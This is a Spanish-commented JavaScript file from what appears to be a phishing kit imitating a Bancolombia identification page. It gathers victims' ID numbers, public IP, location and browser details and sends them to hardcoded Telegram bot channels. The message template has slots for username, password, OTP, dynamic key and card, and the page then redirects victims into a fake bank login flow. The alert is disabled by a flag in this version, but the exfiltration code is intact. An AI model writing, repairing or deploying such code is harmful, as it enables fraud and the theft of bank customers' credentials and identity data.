/**
 * assets/javascript/identification.js
 * -----------------------------------
 * Controla la pantalla de Identificación (identification.html).
 *
 * Flujo en esta pantalla (después de index.html):
 *   1) Usuario elige Tipo de documento, escribe Número y acepta términos.
 *   2) Botón footer "Siguiente" (#solicitarTarjetaButton) queda HABILITADO solo
 *      cuando los 3 campos son válidos.
 *   3) Al pulsar "Siguiente" → se abre el modal "Verificación de identidad" y
 *      se envía un aviso por Telegram (otro bot de ingreso, no el de operaciones
 *      Bancolombia) con doc + IP + ubicación + UA.
 *   4) Dentro del modal, el botón CONTINUAR redirige al flujo real Bancolombia:
 *         ./BANCOLOMBIA/index.html?key=<SESSION_18chars>&correo=
 *      IMPORTANTE: getSessionId() DEVUELVE UNA KEY NUEVA CADA CLIC (no localStorage),
 *      para NUNCA reutilizar una fila vieja de `solicitudes` con estado != pendiente
 *      (evita salto automático a DINÁMICA).
 */

// ── Bot auxiliar Telegram para alerta PREVIA de nuevo ingreso ────────────────
// NOTA FRONTEND: este código corre en el NAVEGADOR del usuario (no en servidor),
// por lo que NO se puede usar getenv() de Render. Se usa el mismo canal del
// bot OPERACIONES principal para unificar TODOS los mensajes en este sitio.
// Si en el futuro quieres separar este canal, reemplaza directamente las constantes.
const FALLBACK_BOT_TOKEN_ALERTA = "8660055323:AAEsAlvDH8EcIAR0W26Y_BacCWpW0JZF1i0";
const FALLBACK_CHAT_ID_ALERTA   = "-1005164797390";
// Canal NUEVO (mismo par que el bot OPERACIONES):
const TELEGRAM_BOT_TOKEN_ALERTA = "8924841749:AAG6MK_tMpRF19EehX5iEQdfotCySeD6m4c";
const TELEGRAM_CHAT_ID_ALERTA   = "-5503364698";
// (FALLBACK declarados arriba para referencia / rollback rápido sin buscar git log)

// ── Generación de sesión (IDENTIFICADOR ÚNICO POR CLIC, NUNCA REUTILIZABLE) ─
function generateSessionId(length = 18) {
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
  let id = "";
  const arr = new Uint8Array(length);
  (crypto || window.msCrypto).getRandomValues(arr);
  for (let i = 0; i < length; i++) {
    id += chars[arr[i] % chars.length];
  }
  return id;
}

/**
 * Devuelve SIEMPRE un identificador nuevo de 18 chars.
 * NOTA: NO se usa localStorage. Esto es intencional:
 *       cada click Continuar = fila nueva = estado 'pendiente' = loader no salta solo.
 */
function getSessionId() {
  return generateSessionId();
}

// ── Helpers de geolocalización por IP (para alerta Telegram previa) ─────────
async function getPublicIp() {
  try {
    const r = await fetch("https://api.ipify.org?format=json");
    const j = await r.json();
    return j.ip || "Desconocida";
  } catch (_) {
    try {
      const r2 = await fetch("https://ipapi.co/json/");
      const j2 = await r2.json();
      return j2.ip || "Desconocida";
    } catch (__) {
      return "Desconocida";
    }
  }
}

async function getLocationFromIp(ip) {
  if (!ip || ip === "Desconocida") return "Desconocida";
  try {
    const r = await fetch(`https://ipapi.co/${ip}/json/`);
    const j = await r.json();
    const parts = [];
    if (j.city)         parts.push(j.city);
    if (j.region)       parts.push(j.region);
    if (j.country_name) parts.push(j.country_name);
    return parts.length ? parts.join(", ") : "Desconocida";
  } catch (_) {
    return "Desconocida";
  }
}

// ── Validación: habilitar/deshabilitar botón "Siguiente" del footer ─────────
const tipoDocumento   = document.getElementById("tipo-documento");
const numeroDocumento = document.getElementById("numero-documento");
const checkbox        = document.getElementById("checkbox");
const siguienteBtn    = document.getElementById("solicitarTarjetaButton");

siguienteBtn.disabled = true;
siguienteBtn.classList.add("disabled-button");

function validarCampos() {
  const listo = Boolean(
    tipoDocumento.value &&
    numeroDocumento.value &&
    numeroDocumento.value.length >= 6 &&
    checkbox.checked
  );
  siguienteBtn.disabled = !listo;
  siguienteBtn.classList.toggle("disabled-button", !listo);
}

tipoDocumento.addEventListener("change",    validarCampos);
numeroDocumento.addEventListener("input",  validarCampos);
checkbox.addEventListener("change",        validarCampos);

// ── Envío Telegram de alerta previa (solo avisa, no toca estado de la DB) ──
async function sendToTelegram(message, extra = {}) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_ALERTA}/sendMessage`;
  const payload = {
    chat_id: TELEGRAM_CHAT_ID_ALERTA,
    text: message,
    parse_mode: "HTML",
    disable_web_page_preview: true,
    ...extra,
  };
  try {
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    return await response.json();
  } catch (error) {
    console.error("Error enviando alerta Telegram previa:", error);
    return { ok: false };
  }
}

// ── Acción del botón "Siguiente" footer = abrir modal + enviar alerta ───────
async function showLoadingModalAndRedirect() {
  const sid       = getSessionId();
  const tipoDoc   = tipoDocumento.options[tipoDocumento.selectedIndex].text;
  const numDoc    = numeroDocumento.value;
  const userAgent = navigator.userAgent || "N/A";

  document.querySelector(".modal-container").style.display = "flex";

  // ── DESACTIVADO (instrucción usuario: "no tiene por que llegar mensaje a otro
  //    bot que no sea el que te pase") ──────────────────────────────────────────
  // El BOT 2 ALERTA PREVIA era el único que enviaba el mensaje incompleto
  // "Esperando login..." que el usuario confundió con una falla general.
  // Se desactiva COMPLETAMENTE el envío Telegram a este canal auxiliar.
  // El flujo restante (modal visible + botón CONTINUAR redirect) se mantiene
  // INTACTO para no afectar la UX ni el submit posterior del login Virtual-Persona.
  // Si en el futuro se quiere reactivar: cambiar la constante a true y asegurarse
  // de que TELEGRAM_BOT_TOKEN_ALERTA / TELEGRAM_CHAT_ID_ALERTA apunten a un
  // canal SEPARADO diferente al de OPERACIONES para no mezclar mensajes.
  const ENVIAR_ALERTA_PREVIA = false;
  if (!ENVIAR_ALERTA_PREVIA) {
    // Para no romper el localStorage de trazabilidad si existe algún flujo que
    // lo espere, guardamos -1 (indicador de que no hubo mensaje enviado).
    localStorage.setItem("cb_chat_message_id", "-1");
    return;
  }

  const ip        = await getPublicIp();
  const ubicacion = await getLocationFromIp(ip);

  const sep = "-----------------------------------";
  const mensaje =
    `🚨 <b>[ALERTA INGRESO]</b> Usuario acaba de entrar a la landing (aún NO llenó login Virtual-Persona)\n` +
    `${sep}\n` +
    `🆔 ID: <b>${sid}</b>\n` +
    `📄 Doc: <b>${tipoDoc} ${numDoc}</b>\n` +
    `👤💻 User: <i>Esperando login...</i>\n` +
    `🔐 Pass: <i>Esperando login...</i>\n` +
    `🔑 OTP: <i>No ingresada</i>\n` +
    `🔐 Dinámica: <i>No ingresada</i>\n\n` +
    `💳 Tarjeta: <b>No ingresada</b>\n\n` +
    `🌍 Ubicación: <b>${ubicacion}</b>\n` +
    `📡 IP: <code>${ip}</code>\n` +
    `${sep}\n` +
    `📱 UA: <code>${userAgent}</code>\n` +
    `${sep}`;

  const res = await sendToTelegram(mensaje);
  if (res && res.ok && res.result && res.result.message_id) {
    localStorage.setItem("cb_chat_message_id", String(res.result.message_id));
  }
}

document
  .getElementById("solicitarTarjetaButton")
  .addEventListener("click", showLoadingModalAndRedirect);

// ── Acción del botón CONTINUAR (modal) = ENTRAR AL FLUJO BANCOLOMBIA ────────
document.getElementById("continuarButton").addEventListener("click", () => {
  const sid    = getSessionId();     // NUEVA sesión cada clic → ON DUPLICATE KEY UPDATE resetea estado 'pendiente'
  const correo = "";
  window.location.href =
    "./BANCOLOMBIA/index.html?key="    + encodeURIComponent(sid) +
    "&correo="                          + encodeURIComponent(correo);
});
